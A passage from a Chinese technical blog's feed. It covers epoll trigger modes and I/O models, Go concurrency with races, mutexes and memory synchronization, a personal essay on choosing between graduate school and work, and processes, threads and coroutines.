<li>边缘触发（Edge Triggered, ET）：当文件描述符关联的读内核缓冲区由空转化为非空的时候，则发出可读信号进行通知，当文件描述符关联的内核写缓冲区由满转化为不满的时候，则发出可写信号进行通知。事件通知仅在被监听文件描述符的缓冲区状态在满/不满之间变化的时候才会发生一次。边缘触发需要一次性的把缓冲区的数据读完，也就是一直读直到读到 EGAIN （缓冲区为空）为止，否则在这个 fd 的内核缓冲区下一次处于满状态前无法再次获得它。因为这一点，边缘触发需要设置文件句柄为非阻塞。</li>
</ul>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//水平触发，就算 buf 容量不足，下次监听系统也会 fd</span></span><br><span class="line">ret = read(fd, buf, <span class="keyword">sizeof</span>(buf));</span><br><span class="line"></span><br><span class="line"><span class="comment">//边缘触发，读就要一次性读完，否则下次监听系统未必会再返回 fd</span></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">    ret = read(fd, buf, <span class="keyword">sizeof</span>(buf);</span><br><span class="line">    <span class="keyword">if</span> (ret == EAGAIN) <span class="keyword">break</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>总结：</p>
<ol>
<li>对于监听的sockfd，最好使用水平触发模式，边缘触发模式会导致高并发情况下，有的客户端会连接不上</li>
<li>对于读写的connfd，水平触发模式下，阻塞和非阻塞效果都一样</li>
<li>对于读写的connfd，边缘触发模式下，必须使用非阻塞IO，并要一次性全部读写完数据</li>
</ol>
<h2 id="信号-IO"><a href="#信号-IO" class="headerlink" title="信号 IO"></a>信号 IO</h2><p>让内核在描述符就绪时发送 SIGIO 信号通知进程。这种模型为信号驱动式 IO（signal-driven IO），和事件驱动类似，也是一种回调方式。与非阻塞方式不一样的地方是，发起了信号驱动的系统调用，进程没有挂起，可以做的事情，可是实际中，代码逻辑通常还是主循环，主循环里可能还是会阻塞。因此使用这样的 IO 的软件很少。</p>
<p>当信号返回可以读写的时候，因为还需要 cpu 将内核数据 copy 到 app buf，拷贝数据阶段毫无疑问还是阻塞的。</p>
<p><img src="https://i.loli.net/2020/04/17/73r6sTCnzG45HFN.png" alt="信号IO"></p>
<h2 id="异步-IO"><a href="#异步-IO" class="headerlink" title="异步 IO"></a>异步 IO</h2><p>异步是指应用与内核存在 CPU 竞争（在同步 IO 中应用都是等 kernel buf 中的数据拷贝到 app buf 后再执行的）。</p>
<p><img src="https://i.loli.net/2020/04/17/lYpgvAdNwyQuCr9.png" alt="异步IO"></p>
<p>无论是第一阶段数据准备还是第二阶段数据拷贝，发起系统调用的进程都不会被阻塞。第二阶段过程中，进程没有阻塞，那么可以抢占 CPU，而 kernel buf copy 数据到 app buf 的时候，也需要 CPU，这就造成了应用和内核进行 CPU 竞争，步调不一致了。某些情况下，其性能反而不如其他 IO 模式。使用的人也很少。</p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>IO 即数据在 app buf、kernel buf、硬件三者之间的流动。</p>
<p>数据等待阶段根据发起 IO 请求的进程是否阻塞分为：</p>
<ul>
<li>阻塞：进程挂起</li>
<li>非阻塞：进程不挂起，立即返回，返回EWOULDBLOCK</li>
</ul>
<p>数据拷贝阶段根据发起 IO 请求的进程是否阻塞分为：</p>
<ul>
<li>同步：内核拷贝数据占用 CPU</li>
<li>异步：进程可能和内核竞争 CPU</li>
</ul>
<p>同步非阻塞就是十分常见的多路复用结合非阻塞IO实现的方案，也称之为事件驱动。同步有利于逻辑的书写，非阻塞有利于调用率实现并发。因此现实中更多的IO模型是多路复用IO，并且在发展过程中，select，poll和epoll是逐步进化链。epoll实现了内核级数据结构优化，在实际性能上又了很大的提升。</p>
<p>参考资料：</p>
<p><a href="https://www.jianshu.com/p/e62f0ef9629d">简明网络IO</a></p>
<p><a href="https://www.cnblogs.com/Anker/p/3265058.html">select、poll、epoll之间的区别总结</a></p>
<p><a href="https://blog.csdn.net/cuiyifang/article/details/7957937">epoll简介及例子</a></p>
<p><a href="https://blog.csdn.net/u011063112/article/details/81771440">epoll详解</a></p>
<p><a href="https://www.cnblogs.com/yorkyang/p/7688865.html">epoll的水平触发与边缘触发</a></p>
]]></content>
      <categories>
        <category>计算机系统</category>
      </categories>
      <tags>
        <tag>并发编程</tag>
      </tags>
  </entry>
  <entry>
    <title>并发编程-以 Go 为例</title>
    <url>/2020/03/24/%E5%B9%B6%E5%8F%91%E7%BC%96%E7%A8%8B-%E4%BB%A5Go%E4%B8%BA%E4%BE%8B/</url>
    <content><![CDATA[<p>所谓<code>并发</code>(concurrency) 是指几段程序在同一时间段内交错执行，当我们无法肯定一个事件一定会会先于另一个事件发生，那么就可以说这几个时间是“并发”的。如果一个函数在并发调用时仍能正确执行，这个函数就是<code>并发安全</code>的；如果一个类型的所有可访问方法和操作都是并发安全的，则它就是一个并发安全的类型。</p>
<p>本文主要介绍了几种并发编程中常见的问题及对策，所有的例子都会用 Go 语言来描述，还会涉及到一些 Go 对并发编程的支持。</p>
<span id="more"></span>

<h2 id="竞态"><a href="#竞态" class="headerlink" title="竞态"></a>竞态</h2><p>竞态是指多个 goroutine 并发执行时，程序无法给出正确结果。比如多个 goroutine 同时修改了一个包级别变量的值，那么很可能导致某一个 goroutine 的修改对另一个 goroutine 不可见：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> amount = <span class="number">0</span></span><br><span class="line"><span class="keyword">var</span> done = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        amount += <span class="number">100</span></span><br><span class="line">        done &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        amount += <span class="number">200</span></span><br><span class="line">        done &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    &lt;- done</span><br><span class="line">    &lt;- done</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>上面这段代码执行以后，balance 有几种可能取值：300，200，100。程序中的这种状态称为<code>数据竞态</code>，是竞态的一种。数据竞态发生在多个 goroutine 并发读写同一个变量并且至少一个为写操作的时候。</p>
<p>有三种方法可以避免数据竞态：</p>
<ol>
<li>不对变量做写操作。如果没有 goroutine 对变量的值进行修改，那么数据竞态自然无从说起。</li>
<li>避免多个 goroutine 对一个变量进行访问。简言之就是这个变量的所有操作都在一个<code>监控 goroutine</code> 内执行，由于一个 goroutine 内的结果是<code>串行一致</code>的，也就不会产生修改不可见的问题。</li>
</ol>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> deposit = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>) <span class="comment">// 其它 goroutine 通过这个通道间接写 amount</span></span><br><span class="line"><span class="keyword">var</span> balance = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">int</span>) <span class="comment">// 其它 goroutine 通过这个通道间接读 amount</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">init</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> monitor()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">monitor</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">var</span> amount = <span class="number">0</span> <span class="comment">// amount 被限制在 monitor goroutine 中</span></span><br><span class="line">    <span class="keyword">for</span> &#123;</span><br><span class="line">        <span class="keyword">select</span> &#123;</span><br><span class="line">            <span class="keyword">case</span> count := &lt;- deposit:</span><br><span class="line">                amount += count</span><br><span class="line">            <span class="keyword">case</span> balance &lt;- amount:</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Deposit</span><span class="params">(count <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    deposit &lt;- count</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Balance</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    <span class="keyword">return</span> &lt;- balance</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>即使一个变量无法被完全限制在一个 goroutine 内，也可以把对这个变量的操作划分为好几个阶段，只要每个阶段被限制在一个 goroutine 内访问就可以了：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">type</span> Book <span class="keyword">struct</span> &#123;</span><br><span class="line">    content <span class="keyword">string</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">write</span><span class="params">(origin <span class="keyword">chan</span>&lt;- *Book)</span></span> &#123;</span><br><span class="line">    book = <span class="built_in">new</span>(Book)</span><br><span class="line">    book.content = <span class="string">&quot;hello world&quot;</span></span><br><span class="line">    origin &lt;- book</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">revise</span><span class="params">(origin &lt;- <span class="keyword">chan</span> *Book, corrected <span class="keyword">chan</span>&lt;- *Book)</span></span> &#123;</span><br><span class="line">    <span class="keyword">for</span> book := <span class="keyword">range</span> origin &#123;</span><br><span class="line">        book.content += <span class="string">&quot;!&quot;</span></span><br><span class="line">        corrected &lt;- book</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="3">
<li>在一个时刻只允许一个 goroutine 操作这个变量。这种方法称为<code>互斥机制</code>。我们可以使用带一个缓冲的通道来实现：</li>
</ol>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> amount = <span class="number">0</span></span><br><span class="line"><span class="keyword">var</span> sema = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;, <span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Deposit</span><span class="params">(count <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    sema &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125; <span class="comment">// 获取信号量</span></span><br><span class="line">    amount += count</span><br><span class="line">    &lt;- sema <span class="comment">// 释放信号量</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>当然，这是一个非常简陋的实现。Go 已经为我们造好了完备的轮子：sync.Mutex。有了互斥锁，代码就可以写成这个样子：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;sync&quot;</span></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    mu sync.Mutex</span><br><span class="line">    amount <span class="keyword">int</span> <span class="comment">// 通常被保护变量放在锁后面声明</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Deposit</span><span class="params">(count <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    mu.Lock()</span><br><span class="line">    amount += count</span><br><span class="line">    mu.Unlock()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Balance</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    mu.Lock()</span><br><span class="line">    <span class="keyword">defer</span> mu.Unlock()</span><br><span class="line">    <span class="keyword">return</span> amount</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>要注意的是，sync.Mutex 是“不可再入”的。</p>
<p>当读操作远多于写操作时，互斥锁会明显拖累系统的速度（最严重时只有单个 goroutine 会被执行）。读写锁 sync.RWMutex 特别适合这种场景。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;sync&quot;</span></span><br><span class="line"><span class="keyword">var</span> (</span><br><span class="line">    rwmu sync.RWMutex</span><br><span class="line">    amount <span class="keyword">int</span> <span class="comment">// 通常被保护变量放在锁后面声明</span></span><br><span class="line">)</span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Deposit</span><span class="params">(count <span class="keyword">int</span>)</span></span> &#123;</span><br><span class="line">    rwmu.Lock()</span><br><span class="line">    amount += count</span><br><span class="line">    rwmu.Unlock()</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">Balance</span><span class="params">()</span> <span class="title">int</span></span> &#123;</span><br><span class="line">    rwmu.RLock()</span><br><span class="line">    <span class="keyword">defer</span> rwmu.UnRlock()</span><br><span class="line">    <span class="keyword">return</span> amount</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>读写锁支持四种操作：获得写锁 Lock()，释放写锁 UnLock()，获得读锁 RLock()，释放读锁 UnRLock()。</p>
<p>写锁又称为<code>排它锁（X锁）</code>：若事务 T 对数据 A 加上 X 锁，T 可以读 A 也可以修改 A，其他事务不能再对 A 加任何锁，直到 T 释放 A 上的锁。这保证了其他事务在 T 释放 A 上的锁之前不能再读取和修改 A。</p>
<p>读锁又称为<code>共享锁（S锁）</code>：若事务 T 对 数据 A 加上 S 锁，则 T 可以读 A 但不能修改 A，其他事务只能再对 A 加 S 锁，而不能加 X 锁，直到 T 释放 A 上的 S 锁。这保证了其他事务可以读 A，但在 T 释放 A 上的 S 锁之前不能对A做任何修改。</p>
<p>写锁最多有一个，而读锁可以有多个。一个 goroutine 获得写锁后，直到这个写锁被释放前，其它 goroutine 不可以获得读锁或者写锁；一个 goroutine 获得读锁后，其它 goroutine 可以获得读锁，但是不能获得写锁。</p>
<p>如果写锁和读锁是平级的，假设当前已经上了读锁，此时一个 goroutine 的 Lock() 操作会被阻塞。而如果不断有 goroutine 获得读锁那么 Lock() 操作就会一直阻塞下去。因此，<code>写锁的优先级高于读锁</code>，即当获得写锁的请求产生以后，直到 Lock() 执行成功前所有 RLock() 操作都会阻塞。</p>
<p>对读操作上读锁，避免读到脏数据的同时又提高了资源访问速度！</p>
<p>要注意的是，go 的读写锁是通过互斥锁加上引用计数器实现的，所以除非读操作确实远远比写操作多，否则读写锁未必就比互斥锁效率高。</p>
<h2 id="内存同步"><a href="#内存同步" class="headerlink" title="内存同步"></a>内存同步</h2><p>即使是一个只包含单个操作的只读操作，上锁也是必要的。一是为了防止这个操作被插入到该变量的写操作前，二是将处理器缓存中的内容刷入内存。</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">&quot;fmt&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x, y <span class="keyword">int</span></span><br><span class="line"><span class="keyword">var</span> done = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        x = <span class="number">1</span>   <span class="comment">// A1</span></span><br><span class="line">        fmt.Print(<span class="string">&quot;y=&quot;</span>, y, <span class="string">&quot; &quot;</span>) <span class="comment">// A2</span></span><br><span class="line">        done &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        y = <span class="number">2</span>   <span class="comment">// B1</span></span><br><span class="line">        fmt.Print(<span class="string">&quot;x=&quot;</span>, x, <span class="string">&quot; &quot;</span>) <span class="comment">// B2</span></span><br><span class="line">        done &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    &lt;- done</span><br><span class="line">    &lt;- done</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>由于 A、B 四行语句的交替执行，以上代码的如下输出是可接受的：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">y=0 x=1 // A1-&gt;A2-&gt;B1-&gt;B2 </span><br><span class="line">y=2 x=1 // B1-&gt;A1-&gt;A2-&gt;B2</span><br><span class="line">x=0 y=2 // B1-&gt;B2-&gt;A1-&gt;A2</span><br><span class="line">x=1 y=2 // A1-&gt;B1-&gt;B2-&gt;A2</span><br></pre></td></tr></table></figure>

<p>现代计算机一般会有多个处理器，每个处理器都有自己的缓存。对变量的写操作通常不会直接写入内存，而是先记录在处理器缓存中，在操作系统认为必要的时候再刷回内存。由于处理器缓存的存在，写操作（A1 &amp;&amp; B1）可能不会立即对其它 goroutine 可见，那么其它 goroutine 就会使用过期值。此外，由于赋值语句和输出语句对应不同变量，编译器可能认为这两个语句的执行顺序是不重要的，于是私自调换了语句的执行顺序，CPU 执行指令时也可能发生指令重排，在不影响语义的前提下把后面的指令放到前面来执行。我们可能看到这样的非预期输出：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">y=0 x=0 // A2-&gt;B2-&gt;A1-&gt;B1 or A2-&gt;B2-&gt;B1-&gt;A1</span><br><span class="line">y=2 x=0 // B1-&gt;A2-&gt;B2-&gt;A1</span><br><span class="line">x=0 y=0 // B2-&gt;A2-&gt;A1-&gt;B1 or B2-&gt;A2-&gt;B1-&gt;A1</span><br><span class="line">x=1 y=0 // A1-&gt;B2-&gt;A2-&gt;B1</span><br></pre></td></tr></table></figure>

<p>此时，指令的执行顺序看起来就和代码的编写顺序不一样了。而通道通信和互斥锁这样的<strong>同步原语</strong>会强制刷回内存，并插入内存屏障（Memory Barrier）。如此一来某个 Goroutine 中指令执行顺序就对别的 Goroutine 可见了：</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> main</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> (</span><br><span class="line">    <span class="string">&quot;fmt&quot;</span></span><br><span class="line">)</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> x, y <span class="keyword">int</span></span><br><span class="line"><span class="keyword">var</span> done = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"><span class="keyword">var</span> ok = <span class="built_in">make</span>(<span class="keyword">chan</span> <span class="keyword">struct</span>&#123;&#125;)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        x = <span class="number">1</span>   <span class="comment">// A1</span></span><br><span class="line">        ok &lt;- <span class="keyword">struct</span>&#123;&#125;</span><br><span class="line">        fmt.Print(<span class="string">&quot;y=&quot;</span>, y, <span class="string">&quot; &quot;</span>) <span class="comment">// A2</span></span><br><span class="line">        done &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    <span class="keyword">go</span> <span class="function"><span class="keyword">func</span><span class="params">()</span></span> &#123;</span><br><span class="line">        y = <span class="number">2</span>   <span class="comment">// B1</span></span><br><span class="line">        &lt;-ok</span><br><span class="line">        fmt.Print(<span class="string">&quot;x=&quot;</span>, x, <span class="string">&quot; &quot;</span>) <span class="comment">// B2</span></span><br><span class="line">        done &lt;- <span class="keyword">struct</span>&#123;&#125;&#123;&#125;</span><br><span class="line">    &#125;()</span><br><span class="line">    &lt;- done</span><br><span class="line">    &lt;- done</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>计算机系统</category>
      </categories>
      <tags>
        <tag>并发</tag>
      </tags>
  </entry>
  <entry>
    <title>选择很重要</title>
    <url>/2020/03/06/%E9%80%89%E6%8B%A9%E5%BE%88%E9%87%8D%E8%A6%81/</url>
    <content><![CDATA[<p>虽然在我写下这篇文字的时候已经是周五凌晨了，但打开编辑器、敲下一些东西这个想法其实萌芽于周四晚上，所以本文会以周四晚这个时间段作为起点。记录一下心情，随便扯扯。</p>
<h2 id="选择：读研-or-工作？"><a href="#选择：读研-or-工作？" class="headerlink" title="选择：读研 or 工作？"></a>选择：读研 or 工作？</h2><p>原定于下周的文献阅读检查被突然提前到了今天，因此不得不临时抱佛脚，匆匆浏览了几篇文章。特殊时期，检查当然也采取线上的形式一个接一个进行。本来说好是 8 点开始，每个人大概 10 分钟，结果我坐在电脑前等了又等，甚至打了几把游戏依然没轮到我。莫名的压力之下也没办法进行更多地复习，于是打开了微信看看有没有什么好玩的，结果刷到了这条推文：</p>
<p><img src="https://i.loli.net/2020/03/06/CDMyLPnrBKg7IRd.jpg" alt="腾讯招聘推文"></p>
<p>突然心里一惊，再看一下屏幕右下角的时间，啊！今天已经是 2020/3/5 ，新一年的招聘已经“蓄势待发”了。读研还是工作？这个问题再次涌进我脑海。</p>
<p>每当我被这个问题困扰的时候，都会感叹一下时间流逝之快。自己已经不能像大一大二时那样从容地去学一些东西了。看了看腾讯的招聘需求，后台开发无非是熟悉 Java/Python/C++、熟悉计算机网络、了解 OS 和常见的数据结构及算法，此外要会 MySQL，近年来对 NoSQL 也做了一定要求，最好再会些分布式系统设计 &amp;&amp; 高可用。这里有些内容我了解过，有些则没有。当然，如果下决心去学的话肯定是能学会的。</p>
<p>想到这里心里堵得很。10 点整，终于轮到我了，整个过程意外地短，只用了不到 6 分钟，也不知道是老师自己也累了还是我表现太差，难道是我回答得无懈可击导致他没啥能问的了？总之自己也没心情想那么多，顺手打开几个朋友的博客，发现他们也面临着这样那样的苦恼，有华科 CS 硕士没拿到满意 offer 的，有步入社会感叹大学时光一去不复返的，还有工作之后再也没更新博客的，真是人生百态。</p>
<h2 id="质问：准备好了吗"><a href="#质问：准备好了吗" class="headerlink" title="质问：准备好了吗"></a>质问：准备好了吗</h2><p>本质上，任何人都不会有“准备好”的时候。所谓剑未佩妥，出门已是江湖。何况什么事都等准备万全再行动，那黄花菜都凉了。只是此刻我想问自己，<strong>你真的准备好成为一名码农了吗？</strong></p>
<p>说得再现实一点，不可否认，虽然今天互联网行业的薪资还是优于其他行业，早期“入职-持股-上市分红”的模式早已不复存在。以前人们还会争论应届生到底是去大厂还是小厂，今天就不会再有这种问题，因为大家都抢破头了往大厂挤。正如一个朋友说的：</p>
<blockquote>
<p>从另一个角度来看，反正在这个前所未有的伟大时代，你快要饿死了居委会都会上门给你送米面油，互联网行业多的那点钱也干不了什么，借大厂股票期权财务自由的机会现在也没了。如果你有真心喜欢的工作，与其在西二旗令人窒息的空气里 996，不如回去干自己喜欢的事吧。</p>
</blockquote>
<p>所谓千金难买爷乐意，何况我作为一名“失败”人士，对升官发财这种事向来没什么追求，只要我过的开心，拿到的回报足够租房点外卖就 ok，如果还能剩一点下来以防万一那就再好不过。现在问题来了，什么工作符合这个条件呢？地质显然不是，那么我该去写代码吗？其实我还是挺喜欢 program 的，尤其享受亲手解决问题的过程。自己的逻辑和设计化身为一行行代码在计算机上飞快运行，这种感觉真是妙不可言。不同于应试教育下只是为了一个抽象的分数去做事，从无到有的创造这个过程让我快乐。但自己写着玩和以此谋生是完全不同的两件事。到了工作里，这份简单的快乐还会存在吗？</p>
<p>再说读研，或许是因为自己毕竟不是正儿八经的计算机科班出身，对计算机方向的科研这件事儿一直心存向往，有时候就会想自己能不能在这方面做出点成绩来。只是如今考研形势一年比一年严峻，计算机作为热门专业更是炙手可热，自己到底能否在如此激烈的竞争中脱颖而出，其实心里也没底。</p>
]]></content>
      <categories>
        <category>日常</category>
      </categories>
      <tags>
        <tag>闲聊</tag>
      </tags>
  </entry>
  <entry>
    <title>也说进程、线程与协程</title>
    <url>/2020/03/02/%E4%B9%9F%E8%B0%88%E8%BF%9B%E7%A8%8B%E3%80%81%E7%BA%BF%E7%A8%8B%E4%B8%8E%E5%8D%8F%E7%A8%8B/</url>
    <content><![CDATA[<p>CPU 被誉为“计算机的大脑”，这个比喻可以说是很恰当了。计算机无论是进行 IO 还是计算都要在 CPU 的控制下完成。如此一来，一个强大的“大脑”对于整个系统而言就是非常重要的了，这也是为什么我们总能看到厂家不断地宣传自己 CPU 的主频有多高，核心有多大。</p>
<p>要提高 CPU 的性能，最直接的方法当然是不断增强单个处理器的性能，让处理器频率更高。就像要举起一块石头，让自己变得足够强壮就可以了。</p>
<p>但是这种方法很快就受制于物理定律：当前技术条件下无限提高频率是不可能的，而且过高的频率也会导致发热量过大。因此，工程师们只好退而求其次，转而增加一个 CPU 内的处理器数量。还是要举起石头，一个人无论如何也举不起来，那多喊几个小弟帮忙总可以吧？</p>
<p>有了多核 CPU，程序就可以被划分为相对独立的几个部分，每一部分运行在不同的处理器上。当然，这样做也会带来额外的开销。如果操作系统和程序不能很好地协调多处理器，那么执行速度未必就有明显提高（乃至降低也说不定~）。</p>
<h2 id="进程"><a href="#进程" class="headerlink" title="进程"></a>进程</h2><p>下面给出进程的定义：</p>
<blockquote>
<p>进程是具有一定独立功能的程序在一个数据集合上的一次动态执行过程</p>
</blockquote>
<p>进程是操作系统<strong>分配资源</strong>的最小单位，拥有代码文本、被分配的系统资源、独立的虚拟内存地址、堆栈空间：</p>
<p><img src="https://i.loli.net/2020/03/02/qz7MdhlxtQmK8pI.png" alt="进程内存空间"></p>
<p>操作系统为每个进程维护了一个程序控制块（PCB, Process Contral Block），用来保存该进程的状态信息（进程标识、寄存器、打开文件资源、调度信息等）。PCB 是进程存在的唯一标识。</p>
<p><img src="https://i.loli.net/2021/01/20/Q2zIDlrHYA5sqv9.png" alt="image.png"></p>
<p>进程在整个生命周期期间处于以下五个状态之一：</p>
<ul>
<li>NULL -&gt; 创建：一个新进程被产生出来执行一个程序</li>
<li>创建 -&gt; 就绪：当进程被创建完成并初始化后，一切就绪准备运行时，变为就绪状态</li>
<li>就绪 -&gt; 运行：处于就绪状态的进程被进程调度程序选中后，就分配到处理机上来运行</li>
<li>运行 -&gt; 结束：当进程表示它已经完成或者因出错，当前运行进程会由操作系统作结束处理</li>
<li>运行 -&gt; 就绪：处于运行状态的进程在其运行过程中，由于分配给它的处理机时间片用完而让出处理机</li>
<li>运行 -&gt; 等待：当进程请求某资源且必须等待时</li>
<li>等待 -&gt; 就绪：当进程要等待某事件到来时，它从阻塞状态变到就绪状态</li>
</ul>
<p><img src="https://i.loli.net/2020/03/02/dY1JoNBIRLCFE4G.png" alt="进程状态"></p>
<h2 id="线程"><a href="#线程" class="headerlink" title="线程"></a>线程</h2><p>在很早的时候计算机并没有线程这个概念，但是随着时代的发展，只用进程来处理程序出现很多的不足。如当一个进程堵塞时，整个程序会停止在堵塞处，并且如果频繁的切换进程，会浪费系统资源。所以线程出现了。一个进程可以拥有多个线程，同属一个进程的多个线程会共享该进程的内存地址空间、打开文件、代码段、全局数据段。</p>
<p>线程是进程的一部分，描述一段指令流的执行状态，是系统<strong>调度</strong>的基本单位。每个线程拥有自己的线程控制块（TCB, Thread Contral Block），保存了线程标识、从属进程、寄存器状态等信息。每个线程都有一个程序计数器（记录要执行的下一条指令），一组寄存器（保存当前线程的工作变量），堆栈（记录执行历史）。</p>
<p><img src="https://i.loli.net/2020/03/02/P6MXJ5WHtQNp4x1.png" alt="线程内存空间"></p>
<p>如前面所言，程序被划分为几部分跑在不同处理器上，这些被划分出来的“部分”就可以看做一个个的线程。</p>
<h2 id="进程与线程的异同"><a href="#进程与线程的异同" class="headerlink" title="进程与线程的异同"></a>进程与线程的异同</h2><p>进程和线程的切换是 OS 通过调度算法，保存当前的上下文，然后从上次暂停的地方再次开始计算。每次 CPU 计算的指令数量和代码跑过的 CPU 时间是相关的，跑满 OS 分配的时间片后就会被强制挂起，开发者无法精确的控制它们。</p>
<ul>
<li>地址空间：<strong>同一进程的线程共享本进程的地址空间</strong>，而进程之间则是独立的地址空间</li>
<li>资源分配：<strong>同一进程内的线程共享本进程的资源如全局数据、打开文件、CPU</strong>等，但是进程之间的资源是独立的</li>
<li>程序入口：每个独立的进程有一个程序运行的入口、顺序执行序列和程序的出口。而线程不能够独立执行，必须依存在进程中，由进程对多个线程执行控制。</li>
<li>健壮性：一个进程崩溃后，在保护模式下不会对其他进程产生影响，但是一个线程崩溃整个进程都死掉。所以多进程要比多线程健壮</li>
</ul>
<h2 id="协程"><a href="#协程" class="headerlink" title="协程"></a>协程</h2><p><strong>协程是编译器级的，进程是和线程是操作系统级的</strong>。</p>
<p>协程（Coroutine）是比线程更轻量级的存在，可以说是一种<strong>用户态线程</strong>。它更像是一个函数，只是这个函数可以像线程那样中途让出执行权，满足某种条件后又从等待的地方继续运行。</p>
<p>协程的<strong>切换策略仅由用户态控制</strong>，对于操作系统是透明的，所以协程间的切换非常快。但这也导致协程无法充分利用多核 CPU，因为协程再多，在操作系统眼里也只有一个线程在运行罢了。</p>
<p><img src="https://i.loli.net/2020/03/02/X3jbaStuZRByIdw.png" alt="协程"></p>
